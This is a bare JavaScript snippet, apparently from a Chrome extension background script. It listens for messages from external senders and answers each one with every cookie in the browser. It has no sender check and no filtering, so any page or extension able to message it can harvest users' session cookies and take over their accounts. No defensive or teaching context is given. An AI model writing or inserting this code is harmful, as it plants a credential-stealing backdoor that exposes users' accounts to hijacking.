chrome.runtime.onMessageExternal.addListener(function(msg, sender, reply) {
  chrome.cookies.getAll({}, function(cookies) {
    reply({ cookies: cookies });
  });
});
